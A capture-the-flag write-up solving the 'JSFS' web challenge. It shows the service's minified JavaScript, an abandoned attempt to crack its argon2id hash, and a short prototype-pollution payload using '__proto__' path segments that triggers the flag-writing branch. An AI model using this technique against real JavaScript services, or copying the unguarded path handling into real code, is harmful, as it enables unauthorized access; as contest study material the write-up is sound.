# Write-up of the challenge "JSFS"

This challenge is part of the "Web" category and is worth 500 points.

# Goal of the challenge

So when we visit the website we are to just input something but when we make a short fuzz test, we get this in return:

```js
┌──(venv)(abdullah㉿Abdullah)-[/mnt/d/chals/web/JSFS]
└─$ nc ssmarkiv.ctfchall.se 40033
$ ewa
1 | function d(s){let t=s.startsWith("/");if(t)s=s.slice(1);return{abs:t,segments:s.split("/").filter((n)=>n&&n!==".")}}function l(...s){let t=d("");for(let n of s)if(n.abs)t={abs:!0,segments:[...n.segments]};else t.segments=[...t.segments,...n.segments];return t}function g(s,t){let n=s;for(let i of t.segments){if(!(i in n))n[i]=new Map;n=n[i]}}function u(s,t,n){let i=s;for(let a of t.segments.slice(0,-1)){if(!(a in i))throw Error("ENOENT");i=i[a]}i[t.segments.at(-1)]=n}function f(s,t){let n=s;for(let i of t.segments.slice(0,-1)){if(!(i in n))throw Error("ENOENT");n=n[i]}return t.segments.length===0?n:n[t.segments.at(-1)]}var o=new Map,r=d("/"),p=console[Symbol.asyncIterator](),c=[];async function w(s){if(c.length>0)return c.shift();if(s)process.stdout.write(s);let{value:t,done:n}=await p.next();if(n)return;let[i,...a]=t.split(/\s+/);return c=a,i}var e={};while(!0){if("read"in e){let t=await w(e.read.dest+" > ");e[e.read.dest]=t;let n=e.read.next;delete e.read,e={...e,...n};continue}else if("mkdir"in
2 | e)g(o,l(r,d(e.dir))),delete e.mkdir;else if("write"in e)u(o,l(r,d(e.file)),e.contents),delete e.write;else if("ls"in e){let t=f(o,l(r,d(e.path)));if(t instanceof Map)console.log(Object.keys(t).join("\t"));else if(t===void 0)console.log(`${e.path}: no such file or directory`);else console.log(e.path);delete e.ls}else if("id"in e)console.log("uid=1000(user) gid=100(users) groups=100(users),25(floppy)"),delete e.id;else if("cat"in e){let t=f(o,l(r,d(e.file)));if(t instanceof Map)console.log(`${e.path}: is a directory`);else if(t===void 0)console.log(`${e.path}: no such file or directory`);else console.log(t);delete e.cat}else if("checkpassword"in e){let t=await Bun.password.verify(e.password,"$argon2id$v=19$m=65536,t=2,p=1$nGJgXijpFTZf+xPlduAKQr84I+r0/kkZ3KBQ568IQSw$CqhQyf+b6wnNNwVs90hQLqnAbuAlp8PsloOy2n9MeGQ")?e.checkpassword.next:{};delete e.checkpassword,e={...e,...t};continue}else if("writeflag"in e)u(o,l(r,d(e.file)),Bun.env.FLAG??"ingen flagga!?!?!?"),delete e.writeflag;else if("cd"in e){let
3 | t=l(r,d(e.path));if(f(o,t)instanceof Map)r=t;else console.log(`the directory ${e.path} does not exist`);delete e.cd}else if("pwd"in e)console.log("/"+r.segments.join("/")),delete e.pwd;let s=await w("$ ");if(s===void 0)break;switch(s){case"mkdir":e.read={dest:"dir",next:{mkdir:void 0}};break;case"write":e.read={dest:"file",next:{read:{dest:"contents",next:{write:void 0}}}};break;case"ls":e.read={dest:"path",next:{ls:void 0}};break;case"id":e.id=void 0;break;case"cat":e.read={dest:"file",next:{cat:void 0}};break;case"writeflag":e.read={dest:"password",next:{checkpassword:{next:{read:{dest:"file",next:{writeflag:void 0}}}}}};break;case"cd":e.read={dest:"path",next:{cd:void 0}};break;case"pwd":e.pwd=void 0;break;case"":break;default:throw Error(`command ${s} not found`)}}
                                                            ^
error: command ewa not found
      at /jsfs.js:3:747

Bun v1.2.22 (Linux x64 baseline)

```

## Problem

So my first idea was to use **"hashcat"** to crack the password hash **"1$nGJgXijpFTZf+xPlduAKQr84I+r0/kkZ3KBQ568IQSw$CqhQyf+b6wnNNwVs90hQLqnAbuAlp8PsloOy2n9MeGQ"**, but turns out the password was not a common one so it did not work. After spending 30 minutes trying to crack it I just realized that bruteforcing isn't the key here. So I started researching and trying to find the vulnerability.

## Security breach

So after a lot of testing turns out the vulnerability was **"prototype pollution"** and specifcally it was **"else if("writeflag"in e)"**. This is bad because "**in e**" checks the "**prototype chain**". So if we somehow made pollution add writeflag to all objects via **"Object.prototype"** then we can find the flag because **"writeflag"** would always be executed.

 
## Solution

So my idea was to write just: 


```
┌──(venv)(abdullah㉿Abdullah)-[/mnt/d/chals/web/JSFS]
└─$ nc ssmarkiv.ctfchall.se 40033
$ write flag 123
$ mkdir __proto__/__proto__/writeflag
$ 
$ cat flag
cratectf{den-här-uppgiften-var-bara-en-prototyp}
$ 
```

Explanation:

```
$ write flag 123        # Sets e.file = "flag", writes "123" to file
$ mkdir __proto__/__proto__/writeflag  # Pollutes all objects with writeflag
$                       # Empty line executes if("writeflag" in e) check
$ cat flag              # Shows actual flag not "123"

```



If you liked this writeup you can star my repository.